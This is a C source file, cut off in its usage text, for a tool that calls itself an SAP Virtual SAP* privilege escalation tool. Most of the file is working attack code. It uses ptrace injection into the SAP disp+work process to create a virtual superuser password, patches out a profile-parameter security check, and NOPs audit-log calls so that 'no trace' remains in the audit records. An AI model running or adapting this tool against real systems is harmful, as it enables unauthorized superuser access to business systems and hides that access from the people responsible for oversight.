/*
 * vsapstar.c — SAP Virtual SAP* Privilege Escalation Tool
 * SAP kernel 916 | x86-64 Linux
 *
 * Technique: ptrace injection into the running disp+work process.
 *   1. Locate disp+work PID and binary path
 *   2. Resolve function addresses — ELF symbol table first (version-independent),
 *      fallback to hardcoded nm offsets for kernel 916 (ASLR handled via maps)
 *   3. Inject mmap(PROT_RWX) syscall into target → scratch page
 *   4. Write client data + output buffer into scratch page
 *   5. Call chosen function inside the target's context (VirtualUserHdl valid there)
 *   6. Read back the 40-char Base32 one-time password
 *
 * Two modes:
 *   Normal  — create_virtual_sapstar (purpose=2, validity 10-30 min)
 *             login/create_virtual_user_sapstar IS checked (server-side, purpose==2 only)
 *   --bypass — create_virtual_user_internal (default purpose=1, validity 0-10080 min)
 *             validity restriction removed (internal accepts 0-10080 min, e.g. 10080 = 7 days)
 *             login/create_virtual_user_sapstar is checked INSIDE create_virtual_user_internal
 *             itself whenever purpose==2 — calling internal directly with -P 2 does NOT
 *             skip this gate (CONFIRMED: --bypass -P 2 still enforces the profile param).
 *             For purpose=1 or 3, the gate is genuinely not checked, but those slots are
 *             only loginable via internal/trusted RFC auth types ('F','I','Y' at DyISign),
 *             not SAP GUI or external RFC SDK.
 *
 * --no-profile-check — one-byte patch (JE->JMP at NM_K916_PROFILE_CHECK_OFF) on the
 *             profile-param check inside create_virtual_user_internal. Forces the
 *             "allowed" branch unconditionally for purpose==2, ignoring
 *             login/create_virtual_user_sapstar entirely. CONFIRMED via decompile
 *             (binja, see disp+work.bndb): the check is
 *               call is_virtual_user_sapstar_disabled(); test al,al; je <allowed>
 *             Combine with -P 2 (--bypass -P 2, or normal mode) for a loginable
 *             (SAP GUI/RFC-usable) purpose=2 slot regardless of the profile param.
 *
 * --no-audit — suppresses the audit log independently of purpose/profile gate
 * and works in all modes.
 *
 * Build:
 *   gcc -O2 -o vsapstar vsapstar.c
 *
 * ASLR note: Handled — we parse /proc/pid/maps to get the runtime base each run.
 *
 * Version portability: ELF symbol lookup is tried first. If symbols are stripped,
 *   falls back to hardcoded offsets (kernel 916 only). Pass -e /path/to/disp+work
 *   to point at the right binary for symbol resolution.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <elf.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <signal.h>

/* ── Fallback offsets for SAP kernel 916 (used if ELF symbols unavailable) ── */
#define NM_K916_CREATE_SAPSTAR    0x00c7f70aUL  /* create_virtual_sapstar       */
#define NM_K916_CREATE_INTERNAL   0x00c7e392UL  /* create_virtual_user_internal */
#define NM_K916_ANCHOR            0x0077aa48UL  /* nlsui_main (T, our anchor)   */
/* whoami (int32): 0=Dispatcher, 1=DIA, 2=Btc, 9=DpMon.
 * VirtualUserHdl (ptr): NULL in dispatcher, non-NULL in initialized WPs.
 * We must inject into a DIA work process (whoami==1, VirtualUserHdl!=NULL). */
#define NM_K916_WHOAMI            0x064ad888UL  /* int32_t whoami               */
#define NM_K916_VIRT_USER_HDL     0x06613ab8UL  /* void* VirtualUserHdl         */

/* Audit log call sites inside create_virtual_user_internal (kernel 916).
 * Both are 5-byte `call rel32` instructions patched to NOP for --no-audit.
 *   SUCCESS:  fires after slot written + broadcast (arg: false = success)
 *   DISABLED: fires only when purpose==2 and login/create_virtual_user_sapstar=off
 */
#define NM_K916_AUDIT_SUCCESS   0x00c7ef6fUL
#define NM_K916_AUDIT_DISABLED  0x00c7e889UL

/* login/create_virtual_user_sapstar profile-param gate, inside
 * create_virtual_user_internal (kernel 916). For purpose==2 only:
 *   call is_virtual_user_sapstar_disabled()
 *   test al, al
 *   je   <allowed-path>     <-- byte 0x74 at this offset
 *   <fallthrough: param disabled -> audit "DISABLED" + return rc=8 (deny)>
 * Patching 0x74 (JE) -> 0xEB (JMP) makes the "allowed" branch unconditional,
 * i.e. ignores login/create_virtual_user_sapstar entirely for purpose==2.
 * Used by --no-profile-check. One-byte patch, restored after the call.
 *
 * Stored as an OFFSET FROM create_virtual_user_internal's entry point (not an
 * absolute nm address) so it stays correct when off_internal comes from ELF
 * symbol resolution on a binary build with a different link layout
 * (e.g. the -0x400000 delta build seen on vhcals4hci-class systems). */
#define NM_K916_PROFILE_CHECK_OFF (0x00c7e7d9UL - NM_K916_CREATE_INTERNAL)

/* ELF symbol names */
#define SYM_ANCHOR     "nlsui_main"
#define SYM_SAPSTAR    "create_virtual_sapstar"
#define SYM_INTERNAL   "_ZL28create_virtual_user_internalRA3_KDsN12SAP_KRN_SIGN20VIRTUAL_USER_PURPOSEEiRA40_Ds"
#define SYM_WHOAMI     "whoami"
#define SYM_VIRT_HDL   "_ZL14VirtualUserHdl"
#define SYM_AUDIT_LOG  "_ZL29virtual_user_audit_log_createPKDsN12SAP_KRN_SIGN20VIRTUAL_USER_PURPOSEEib"
/* Some kernel builds don't wrap the audit write in virtual_user_audit_log_
 * create at all — create_virtual_user_internal calls the low-level audit
 * writer directly instead (rsauwri2ex — the versioned successor to
 * rsauwr1ex, which sap_audit_hook.c already hooks on the 916 reference
 * build). Tried as a fallback candidate when SYM_AUDIT_LOG doesn't resolve. */
#define SYM_AUDIT_LOG_ALT "rsauwri2ex"
#define SYM_DISABLED   "_ZN12SAP_KRN_SIGN14LogonConstants32is_virtual_user_sapstar_disabledEv"
#define SYM_SET_SESSION "_Z21ThWpSetCurrentSession15DP_SESSION_INFO"
/* GCC isra-cloned local symbol — suffix is compiler/build-specific and not
 * guaranteed stable across all builds, but observed identical on both the
 * kernel-916 reference build and the 7.93 PL101 build. ELF resolution still
 * aborts cleanly (no hardcoded-offset fallback exists for this) if a build
 * doesn't have this exact name. */
#define SYM_GLOBAL_AREAS "_ZL16dyGetGlobalAreasv.isra.0"
#define SYM_FILLENQUE  "_ZL23LocFunc_FillEnqueStructPDshP11EnsaRequest"
/* Generous window covering LocFunc_FillEnqueStruct's whole body — used only
 * to bound where a SIGSEGV is considered "the known recoverable null-deref"
 * under the enqueue-crash recovery (on by default). Doesn't need to be exact; it's a safety fence,
 * not an offset we trust blindly (the actual instruction bytes are still
 * checked before anything is patched). */
#define FILLENQUE_WINDOW 0x1000UL

/* Sentinel DP_SESSION_INFO used by --set-session: matches the value ThStart's
 * own dispatch loop builds for this exact request path (external/admin
 * requests not tied to a specific ABAP user session) before looking up the
 * request handler and calling it — low 56 bits forced to all-1s ("no specific
 * session"), top byte left 0. Not a guess: reverse-engineered from ThStart's
 * `or $0x00ffffffffffffff, stack_val` immediately preceding the real
 * ThWpSetCurrentSession call on this same dispatch path. */
#define DP_SESSION_INFO_NONE 0x00ffffffffffffffULL

#define PW_BUF_CHARS  40
#define RC_OK         0

/* ── ELF symbol resolution ───────────────────────────────────────────── */
/*
 * Resolve a symbol's nm-style address (relative to load base = 0) directly
 * from the ELF binary on disk. Works for both T (global) and t (local) symbols.
 * Returns 0 if not found.
 */
/*
 * Batch variant: resolves `n` symbol names in a single pass over the binary.
 * One open(), one bulk read of the symtab (or dynsym) and its strtab, one
 * linear scan matching every wanted name — instead of re-opening the file
 * and re-scanning the whole symtab from scratch per name (this binary's
 * symtab can be tens of thousands of entries; doing that 6x, with a pread()
 * syscall per individual Elf64_Sym, was the actual cost driver).
 * results[i] is left at 0 if names[i] isn't found.
 */
static void elf_resolve_symbols(const char *binary_path,
                                 const char *const *names, uintptr_t *results, int n) {
    for (int i = 0; i < n; i++) results[i] = 0;

    int fd = open(binary_path, O_RDONLY);
    if (fd < 0) return;

    Elf64_Ehdr ehdr;
    if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) { close(fd); return; }
    if (memcmp(ehdr.e_ident, ELFMAG, 4) != 0) { close(fd); return; }

    Elf64_Shdr *shdrs = malloc((size_t)ehdr.e_shnum * sizeof(Elf64_Shdr));
    if (!shdrs) { close(fd); return; }
    if (pread(fd, shdrs, (size_t)ehdr.e_shnum * sizeof(Elf64_Shdr), ehdr.e_shoff)
            != (ssize_t)((size_t)ehdr.e_shnum * sizeof(Elf64_Shdr))) {
        free(shdrs); close(fd); return;
    }

    /* Prefer SHT_SYMTAB (full table); fall back to SHT_DYNSYM. */
    uint32_t shtype_priority[] = { SHT_SYMTAB, SHT_DYNSYM, 0 };
    int remaining = n;

    for (int pass = 0; shtype_priority[pass] && remaining; pass++) {
        uint32_t want_type = shtype_priority[pass];

        for (int i = 0; i < ehdr.e_shnum && remaining; i++) {
            Elf64_Shdr *shdr = &shdrs[i];
            if (shdr->sh_type != want_type) continue;
            if (shdr->sh_link >= (uint32_t)ehdr.e_shnum) continue;
            Elf64_Shdr *strhdr = &shdrs[shdr->sh_link];

            char *strtab = malloc(strhdr->sh_size);
            if (!strtab) continue;
            if (pread(fd, strtab, strhdr->sh_size, strhdr->sh_offset) != (ssize_t)strhdr->sh_size) {
                free(strtab); continue;
            }

            size_t nsyms = shdr->sh_size / sizeof(Elf64_Sym);
            Elf64_Sym *syms = malloc(nsyms * sizeof(Elf64_Sym));
            if (!syms) { free(strtab); continue; }
            if (pread(fd, syms, nsyms * sizeof(Elf64_Sym), shdr->sh_offset)
                    != (ssize_t)(nsyms * sizeof(Elf64_Sym))) {
                free(syms); free(strtab); continue;
            }

            for (size_t j = 0; j < nsyms && remaining; j++) {
                if (syms[j].st_value == 0) continue;
                if (syms[j].st_name >= strhdr->sh_size) continue;
                const char *sym_name = strtab + syms[j].st_name;
                for (int k = 0; k < n; k++) {
                    if (!results[k] && !strcmp(sym_name, names[k])) {
                        results[k] = (uintptr_t)syms[j].st_value;
                        remaining--;
                    }
                }
            }
            free(syms);
            free(strtab);
        }
    }
    free(shdrs);
    close(fd);
}

/* ── Find all disp+work PIDs ──────────────────────────────────────────── */
#define MAX_PIDS 64
static int find_all_disp_work(const char *hint,
                               pid_t pids[MAX_PIDS], char exe_out[512]) {
    DIR *d = opendir("/proc");
    if (!d) { perror("opendir /proc"); return 0; }
    int n = 0;
    struct dirent *e;
    while ((e = readdir(d)) != NULL && n < MAX_PIDS) {
        if (!e->d_name[0] || e->d_name[0] < '1') continue;
        char link[256]; char resolved[512] = {0};
        snprintf(link, sizeof(link), "/proc/%s/exe", e->d_name);
        if (readlink(link, resolved, sizeof(resolved)-1) < 0) continue;
        const char *base = strrchr(resolved, '/');
        if (!base || strcmp(base+1, "disp+work") != 0) continue;
        if (hint && !strstr(resolved, hint)) continue;
        pids[n++] = (pid_t)atoi(e->d_name);
        if (n == 1 && exe_out) snprintf(exe_out, 512, "%s", resolved);
    }
    closedir(d);
    return n;
}

/* forward declaration needed by select_work_process */
static uintptr_t get_exe_base(pid_t pid);

/* ── Read a 32-bit or 64-bit value from a running process ───────────── */
static uint64_t read_remote_uint64(pid_t pid, uintptr_t addr) {
    uint64_t val = 0;
    struct iovec l = { &val, sizeof(val) }, r = { (void*)addr, sizeof(val) };
    if (process_vm_readv(pid, &l, 1, &r, 1, 0) != sizeof(val)) return (uint64_t)-1;
    return val;
}
static uint32_t read_remote_uint32(pid_t pid, uintptr_t addr) {
    uint32_t val = 0;
    struct iovec l = { &val, sizeof(val) }, r = { (void*)addr, sizeof(val) };
    if (process_vm_readv(pid, &l, 1, &r, 1, 0) != sizeof(val)) return (uint32_t)-1;
    return val;
}

/*
 * Select the best disp+work PID for injection:
 *   - Requires VirtualUserHdl != NULL  (uninitialized in dispatcher)
 *   - Prefers whoami == 1  (Dialog Work Process)
 * Falls back to any process with VirtualUserHdl != NULL if no DIA found.
 */
static pid_t select_work_process(pid_t *pids, int n, uintptr_t base,
                                  uintptr_t off_whoami, uintptr_t off_vhdl,
                                  int quiet) {
    pid_t best = 0;
    int   best_dia = 0;

    for (int i = 0; i < n; i++) {
        uintptr_t b = get_exe_base(pids[i]);
        if (!b) continue;
        uintptr_t vhdl_addr    = b + off_vhdl;
        uintptr_t whoami_addr  = b + off_whoami;
        uint64_t  vhdl         = read_remote_uint64(pids[i], vhdl_addr);
        uint32_t  wami         = read_remote_uint32(pids[i], whoami_addr);
        int       is_dia       = (wami == 1);
        if (!quiet)
            printf("[*] PID %-6d  whoami=%-2u  VirtualUserHdl=%s\n",
                   pids[i], wami, vhdl ? "initialized" : "NULL");
        if (vhdl == 0 || vhdl == (uint64_t)-1) continue;  /* skip dispatcher/uninit */
        if (!best || (is_dia && !best_dia)) {
            best     = pids[i];
            best_dia = is_dia;
        }
    }
    return best;
}

/* ── Get text segment base from /proc/pid/maps ───────────────────────── */
static uintptr_t get_exe_base(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) { perror("fopen maps"); return 0; }
    char line[512]; uintptr_t base = 0;
    while (fgets(line, sizeof(line), f)) {
        uintptr_t start; char perms[8], pathname[256] = {0};
        sscanf(line, "%lx-%*x %s %*s %*s %*s %255s", &start, perms, pathname);
        if (strchr(perms, 'x') && strstr(pathname, "disp+work")) { base = start; break; }
    }
    fclose(f);
    return base;
}

/* ── Process memory I/O ──────────────────────────────────────────────── */
/*
 * mem_write_rw:  write to writable (data/stack/heap) pages — uses process_vm_writev.
 * mem_write_text: write to text (r-x) pages — uses PTRACE_POKETEXT which bypasses
 *                 page permissions. process_vm_writev would silently fail on r-x pages.
 * mem_read:       works on any mapped page.
 */
static int mem_write_rw(pid_t pid, uintptr_t addr, const void *data, size_t len) {
    struct iovec l = { (void*)data, len }, r = { (void*)addr, len };
    return process_vm_writev(pid, &l, 1, &r, 1, 0) == (ssize_t)len ? 0 : -1;
}
static int mem_read(pid_t pid, uintptr_t addr, void *buf, size_t len) {
    struct iovec l = { buf, len }, r = { (void*)addr, len };
    return process_vm_readv(pid, &l, 1, &r, 1, 0) == (ssize_t)len ? 0 : -1;
}
/* Write up to 8 bytes into a (possibly read-only) text page via PTRACE_POKETEXT.
 * Reads the aligned 8-byte word first, patches the relevant bytes, writes back. */
static int poke_text(pid_t pid, uintptr_t addr, const void *data, size_t len) {
    uintptr_t aligned = addr & ~7UL;
    size_t     off    = addr - aligned;
    long orig = ptrace(PTRACE_PEEKTEXT, pid, aligned, 0);
    if (orig == -1 && errno) return -1;
    uint8_t word[8];
    memcpy(word, &orig, 8);
    memcpy(word + off, data, len);
    long patched; memcpy(&patched, word, 8);
    return ptrace(PTRACE_POKETEXT, pid, aligned, patched) == 0 ? 0 : -1;
}
static int peek_text(pid_t pid, uintptr_t addr, void *buf, size_t len) {
    uintptr_t aligned = addr & ~7UL;
    size_t     off    = addr - aligned;
    long orig = ptrace(PTRACE_PEEKTEXT, pid, aligned, 0);
    if (orig == -1 && errno) return -1;
    uint8_t word[8]; memcpy(word, &orig, 8);
    memcpy(buf, word + off, len);
    return 0;
}

/* Multi-word variants — handle writes/reads that span 8-byte boundaries. */
static int poke_text_n(pid_t pid, uintptr_t addr, const void *data, size_t len) {
    const uint8_t *p = data;
    while (len > 0) {
        size_t off   = addr & 7UL;
        size_t chunk = 8 - off;
        if (chunk > len) chunk = len;
        if (poke_text(pid, addr, p, chunk) < 0) return -1;
        addr += chunk; p += chunk; len -= chunk;
    }
    return 0;
}
static int peek_text_n(pid_t pid, uintptr_t addr, void *buf, size_t len) {
    uint8_t *p = buf;
    while (len > 0) {
        size_t off   = addr & 7UL;
        size_t chunk = 8 - off;
        if (chunk > len) chunk = len;
        if (peek_text(pid, addr, p, chunk) < 0) return -1;
        addr += chunk; p += chunk; len -= chunk;
    }
    return 0;
}

/* ── Inject a raw syscall into target, return rax ────────────────────── */
/*
 * Patches 3 bytes at 'site' in the text section using PTRACE_POKETEXT
 * (bypasses r-x page permissions — process_vm_writev would fail silently).
 * Restores original bytes after the syscall completes.
 */
static long inject_syscall(pid_t pid, struct user_regs_struct *saved,
                            uintptr_t site, long nr,
                            long a1, long a2, long a3, long a4, long a5, long a6) {
    uint8_t orig[3], patch[3] = { 0x0f, 0x05, 0xcc };  /* syscall; int3 */
    if (peek_text(pid, site, orig, 3) < 0) return -1;
    if (poke_text(pid, site, patch, 3) < 0) return -1;

    struct user_regs_struct r = *saved;
    r.rip = site; r.rax = (unsigned long long)nr;
    r.rdi = (unsigned long long)a1; r.rsi = (unsigned long long)a2;
    r.rdx = (unsigned long long)a3; r.r10 = (unsigned long long)a4;
    r.r8  = (unsigned long long)a5; r.r9  = (unsigned long long)a6;
    ptrace(PTRACE_SETREGS, pid, 0, &r);
    ptrace(PTRACE_CONT, pid, 0, 0);
    waitpid(pid, NULL, 0);

    struct user_regs_struct res;
    ptrace(PTRACE_GETREGS, pid, 0, &res);
    poke_text(pid, site, orig, 3);  /* restore — also uses PTRACE_POKETEXT */
    return (long)res.rax;
}

/* ── Find a syscall instruction (0f 05) in target text ──────────────── */
static uintptr_t find_syscall_site(pid_t pid, uintptr_t base, size_t scan) {
    uint8_t buf[4096];
    for (size_t off = 0; off < scan; off += sizeof(buf)) {
        size_t n = (off + sizeof(buf) > scan) ? (scan - off) : sizeof(buf);
        if (mem_read(pid, base + off, buf, n) < 0) continue;
        for (size_t i = 0; i + 1 < n; i++)
            if (buf[i] == 0x0f && buf[i+1] == 0x05) return base + off + i;
    }
    return 0;
}

/* ── Call a function in the target via ptrace ────────────────────────── */
/*
 * rip=fn, rdi=a1, rsi=a2, rdx=a3, rcx=a4.
 *
 * Return trap: INT3 planted in text using PTRACE_POKETEXT (not in data page
 * — data/stack is PROT_RW only, non-executable, so INT3 there won't trigger).
 * We pick `trap_site` = first byte of the function itself, saved and restored.
 * We plant INT3 there, run the function, stop on INT3 when function returns
 * and jumps to trap_site, read rax, restore.
 *
 * Wait — actually we can't put the return trap AT the function start (it gets
 * overwritten and never reached on normal return). We need the INT3 at a
 * DIFFERENT text address that the function will return TO via `ret`.
 *
 * Approach: find a safe "cold" byte in text just after the function, plant INT3
 * there as the return address. The function's `ret` pops [rsp] = &trap_in_text
 * and jumps to it, hitting INT3.
 *
 * Simpler: use the syscall_site itself as the return trap — the site is known-good
 * text, already has a `syscall` byte (0f 05). We patch byte 0 to INT3 temporarily.
 *
 * Stack: fresh 1 MB R/W allocation, far from the target's live stack.
 */
#define SCRATCH_SIZE 0x100000  /* 1 MB — 64KB wasn't enough, function's stack frame overruns it */

/*
 * Recognize a 3-byte simple register-indirect load — REX prefix (0x40-0x4f)
 * + 0x8B opcode + modrm with mod==00 and rm not in {4,5} (no SIB, no
 * rip-relative) — i.e. `mov reg32/64, [reg]` with no displacement. This is
 * the exact shape of the crashing instruction inside LocFunc_FillEnqueStruct
 * (`41 8b 0b` = mov (%r11),%ecx) when it dereferences a null pointer read
 * from a per-task field that's only populated during real request dispatch.
 * Returns instruction length (3) if it matches, 0 otherwise.
 */
static int decode_simple_mov_load(const uint8_t *b) {
    if ((b[0] & 0xf0) != 0x40) return 0;         /* REX prefix */
    if (b[1] != 0x8b) return 0;                  /* MOV r, r/m */
    uint8_t modrm = b[2];
    uint8_t mod = (modrm >> 6) & 0x3;
    uint8_t rm  = modrm & 0x7;
    if (mod != 0) return 0;                      /* no displacement */
    if (rm == 4 || rm == 5) return 0;             /* no SIB, no rip-relative */
    return 3;
}

static int call_in_target(pid_t pid, struct user_regs_struct *saved,
                           uintptr_t scratch_rw,  /* R/W data+stack page */
                           uintptr_t trap_site,   /* text location for INT3 trap */
                           uintptr_t fn,
                           uintptr_t a1, uintptr_t a2, long a3, long a4,
                           int singlestep, uintptr_t base,
                           int *ok_out, /* optional: set 1 if the call returned
                                        * cleanly via trap_site, 0 otherwise
                                        * (crash/wrong stop). NULL to ignore. */
                           uintptr_t recover_lo, uintptr_t recover_hi
                           /* optional [lo,hi) text range in which a SIGSEGV is
                            * treated as a known, recoverable null-deref rather
                            * than fatal: verify the faulting instruction is
                            * the simple-load shape above, zero its destination
                            * register, skip past it, and keep running. Both 0
                            * disables recovery (original behavior). */) {
    if (ok_out) *ok_out = 0;
    /* Plant INT3 at trap_site in text (PTRACE_POKETEXT bypasses r-x perms) */
    uint8_t trap_orig[1];
    uint8_t trap_byte[1] = { 0xcc };
    if (peek_text(pid, trap_site, trap_orig, 1) < 0) return -1;
    if (poke_text(pid, trap_site, trap_byte, 1) < 0) return -1;

    struct user_regs_struct r = *saved;
    r.rip = fn;
    r.rdi = a1; r.rsi = a2;
    r.rdx = (unsigned long long)a3; r.rcx = (unsigned long long)a4;

    /*
     * Build fresh stack near the top of the R/W scratch region.
     * System V AMD64 ABI at function entry: rsp = 16n-8 (return addr at [rsp]).
     */
    uintptr_t stack_top = scratch_rw + SCRATCH_SIZE - 16;
    stack_top &= ~0xfUL;   /* align to 16 */
    stack_top -= 8;         /* rsp = 16n-8 on function entry */
    r.rsp = stack_top;

    /* Return address → trap_site (INT3 in text) */
    uintptr_t ret_addr = trap_site;
    mem_write_rw(pid, r.rsp, &ret_addr, 8);

    ptrace(PTRACE_SETREGS, pid, 0, &r);

    int ws;
    if (singlestep) {
        /* Ring buffer of the last steps' RIP + key registers, for diagnosing
         * where execution goes off the rails (e.g. a wild call/jmp into
         * unrelated code via a bad pointer in a register). */
        #define SS_RING 32
        struct { uintptr_t rip, rax, rdi, rsi, r9, rbx; } ring[SS_RING] = {{0}};
        int n = 0;
        long max_steps = 200000;
        for (long step = 0; step < max_steps; step++) {
            ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
            waitpid(pid, &ws, 0);
            if (!WIFSTOPPED(ws)) {
                fprintf(stderr, "[singlestep] target exited/signalled at step %ld (ws=0x%x)\n", step, ws);
                break;
            }
            struct user_regs_struct sr;
            ptrace(PTRACE_GETREGS, pid, 0, &sr);
            ring[n % SS_RING] = (typeof(ring[0])){
                .rip = sr.rip, .rax = sr.rax, .rdi = sr.rdi,
                .rsi = sr.rsi, .r9 = sr.r9, .rbx = sr.rbx
            };
            n++;
            int ssig = WSTOPSIG(ws);
            if (ssig != SIGTRAP) {
                fprintf(stderr, "[singlestep] stopped at step %ld: signal=%d (%s), rip=0x%llx, rax=0x%llx\n",
                        step, ssig, strsignal(ssig), sr.rip, sr.rax);

                /* Fault diagnostics: is rax itself an unmapped pointer, or a
                 * valid object pointer one dereference short of a vtable? Also
                 * snapshot the two "context" globals seen in the healthy trace
                 * (base+0x70AF900 and base+0x70AF728) for before/after compare. */
                errno = 0;
                long rax_deref = ptrace(PTRACE_PEEKTEXT, pid, (void*)sr.rax, 0);
                int rax_err = errno;
                fprintf(stderr, "[singlestep] [rax]=0x%lx (peek %s%s)\n",
                        (unsigned long)rax_deref,
                        rax_err ? "FAILED: " : "ok",
                        rax_err ? strerror(rax_err) : "");

                /* Dump the "this" object (rax) and its vtable ([rax]) fields,
                 * to find where the expected vtable slot falls off mapped
                 * memory. */
                fprintf(stderr, "[singlestep] object @ rax=0x%llx:\n", sr.rax);
                for (int i = 0; i < 8; i++) {
                    errno = 0;
                    long v = ptrace(PTRACE_PEEKTEXT, pid, (void*)(sr.rax + i*8), 0);
                    if (errno) {
                        fprintf(stderr, "  +0x%02x: PEEK FAILED: %s\n", i*8, strerror(errno));
                    } else {
                        fprintf(stderr, "  +0x%02x: 0x%016lx\n", i*8, (unsigned long)v);
                    }
                }
                if (!rax_err && rax_deref > 0x1000) {
                    fprintf(stderr, "[singlestep] vtable @ [rax]=0x%lx:\n", (unsigned long)rax_deref);
                    for (int i = 0; i < 16; i++) {
                        errno = 0;
                        long v = ptrace(PTRACE_PEEKTEXT, pid, (void*)((uintptr_t)rax_deref + i*8), 0);
                        if (errno) {
                            fprintf(stderr, "  +0x%02x: PEEK FAILED: %s\n", i*8, strerror(errno));
                        } else {
                            fprintf(stderr, "  +0x%02x: 0x%016lx\n", i*8, (unsigned long)v);
                        }
                    }
                }
                break;
            }
            if (sr.rip == trap_site) {
                fprintf(stderr, "[singlestep] reached trap_site after %ld steps\n", step);
                break;
            }
            if (step > 0 && step % 5000 == 0) {
                fprintf(stderr, "[singlestep] step %ld: rip=0x%llx\n", step, sr.rip);
            }
        }
        int count = n < SS_RING ? n : SS_RING;
        int start = n < SS_RING ? 0 : (n % SS_RING);
        fprintf(stderr, "[singlestep] last %d steps (oldest first, of %d total):\n", count, n);
        for (int k = 0; k < count; k++) {
            int idx = (start + k) % SS_RING;
            fprintf(stderr, "  [step %d] rip=0x%lx rax=0x%lx rdi=0x%lx rsi=0x%lx r9=0x%lx rbx=0x%lx\n",
                    n - count + k, ring[idx].rip, ring[idx].rax, ring[idx].rdi,
                    ring[idx].rsi, ring[idx].r9, ring[idx].rbx);
        }
    } else {
        int recover_budget = 16; /* cap: never loop forever on repeated faults */
        for (;;) {
            ptrace(PTRACE_CONT, pid, 0, 0);
            waitpid(pid, &ws, 0);
            if (!WIFSTOPPED(ws) || WSTOPSIG(ws) != SIGSEGV) break;
            if (!(recover_lo && recover_hi) || recover_budget <= 0) break;

            struct user_regs_struct fr;
            ptrace(PTRACE_GETREGS, pid, 0, &fr);
            if (fr.rip < recover_lo || fr.rip >= recover_hi) break;

            uint8_t ibuf[4] = {0};
            if (mem_read(pid, fr.rip, ibuf, sizeof(ibuf)) != 0) break;
            int ilen = decode_simple_mov_load(ibuf);
            if (!ilen) break; /* not the known shape — don't guess, treat as fatal */

            int reg_idx = ((ibuf[0] & 0x4) << 1) | ((ibuf[2] >> 3) & 0x7); /* REX.R:reg */
            unsigned long long *slot = NULL;
            switch (reg_idx) {
                case 0: slot = (unsigned long long*)&fr.rax; break;
                case 1: slot = (unsigned long long*)&fr.rcx; break;
                case 2: slot = (unsigned long long*)&fr.rdx; break;
                case 3: slot = (unsigned long long*)&fr.rbx; break;
                case 4: slot = (unsigned long long*)&fr.rsp; break;
                case 5: slot = (unsigned long long*)&fr.rbp; break;
                case 6: slot = (unsigned long long*)&fr.rsi; break;
                case 7: slot = (unsigned long long*)&fr.rdi; break;
                case 8: slot = (unsigned long long*)&fr.r8;  break;
                case 9: slot = (unsigned long long*)&fr.r9;  break;
                case 10: slot = (unsigned long long*)&fr.r10; break;
                case 11: slot = (unsigned long long*)&fr.r11; break;
                case 12: slot = (unsigned long long*)&fr.r12; break;
                case 13: slot = (unsigned long long*)&fr.r13; break;
                case 14: slot = (unsigned long long*)&fr.r14; break;
                case 15: slot = (unsigned long long*)&fr.r15; break;
            }
            if (!slot) break;

            fprintf(stderr,
                "[*] Recovered from expected null-deref at 0x%llx "
                "(zeroed reg #%d, skipped %d bytes, %d attempt(s) left)\n",
                fr.rip, reg_idx, ilen, recover_budget - 1);
            *slot = 0;
            fr.rip += ilen;
            ptrace(PTRACE_SETREGS, pid, 0, &fr);
            recover_budget--;
        }
    }
    /* Restore INT3 site regardless of how we stopped */
    poke_text(pid, trap_site, trap_orig, 1);

    if (!WIFSTOPPED(ws)) {
        fprintf(stderr, "[debug] target did not stop via signal (ws=0x%x, "
                "exited=%d status=%d)\n", ws, WIFEXITED(ws), WIFEXITED(ws)?WEXITSTATUS(ws):-1);
        return -1;
    }

    struct user_regs_struct res;
    ptrace(PTRACE_GETREGS, pid, 0, &res);

    int sig = WSTOPSIG(ws);
    /* RIP after INT3 should be trap_site+1. Anything else means the call
     * didn't return cleanly to our trap (crash, wrong epilogue, etc.) */
    if (sig != SIGTRAP || res.rip != trap_site + 1) {
        fprintf(stderr,
            "[debug] unexpected stop: signal=%d (%s), rip=0x%llx "
            "(expected trap_site+1=0x%lx), rax=0x%llx rsp=0x%llx\n",
            sig, strsignal(sig), res.rip, trap_site + 1,
            res.rax, res.rsp);
    } else if (ok_out) {
        *ok_out = 1;
    }
    return (int)(int32_t)res.rax;
}

/* ── UTF-16 helpers ──────────────────────────────────────────────────── */
static void to_utf16(const char *s, uint16_t *d, size_t n) {
    for (size_t i = 0; i < n && s[i]; i++) d[i] = (uint16_t)(unsigned char)s[i];
}
static void from_utf16(const uint16_t *s, char *d, size_t n) {
    size_t i;
    for (i = 0; i < n; i++) d[i] = (s[i] < 0x80) ? (char)s[i] : '?';
    while (i > 0 && d[i-1] == ' ') i--;
    d[i] = '\0';
}

/* ── Usage ───────────────────────────────────────────────────────────── */
static void usage(const char *p) {
    fprintf(stderr,
"vsapstar — SAP Virtual SAP* Privilege Escalation Tool\n"
"Kernel: 916 (ELF symbols preferred, nm offsets as fallback)\n\n"
"Usage: %s [options]\n\n"
"Options:\n"
"  -c <client>    3-digit SAP client  (default: 000)\n"
"  -v <minutes>   Validity window     (default: 10)\n"
"  --bypass       Call create_virtual_user_internal with purpose=1\n"
"                   Bypasses login/create_virtual_user_sapstar (purpose-2-only gate)\n"
"                   Removes 10-30 min restriction (internal accepts 0-10080 min)\n"
"  --no-audit     Suppress the SAP Security Audit Log (EUP/CREATE) entry\n"
"                   NOPs virtual_user_audit_log_create call sites before invoke,\n"
"                   restores them immediately after — no trace left in SM20/RSAU\n"
"  --no-profile-check  Ignore login/create_virtual_user_sapstar for purpose==2\n"
"                   One-byte patch (JE->JMP) on the profile-param check inside\n"
"                   create_virtual_user_internal; restored immediately after.\n"
"                   Combine with -P 2 (or normal mode) for a loginable slot\n"
"                   regardless of the profile parameter's value.\n"
"  -P <1|2|3>     Override purpose in bypass mode (default with --bypass: 1)\n"
"  --force-legacy-offsets  If ELF symbol lookup fails, use hardcoded kernel-916\n"
"                   nm offsets anyway instead of aborting. UNSAFE on a kernel\n"
"                   build/release the offsets weren't taken from — can corrupt\n"
"                   the target process. Only use if you've verified the layout.\n"
"  --set-session  FALLBACK, not needed on tested builds (7.93 PL101, kernel\n"
"                   916 reference) — --no-patch-enque-crash's live recovery\n"
"                   already handles the enqueue-lock crash on those. Calls\n"
"                   ThWpSetCurrentSession(no-session-sentinel) on the target\n"
"                   work process immediately before create_virtual_*, priming\n"
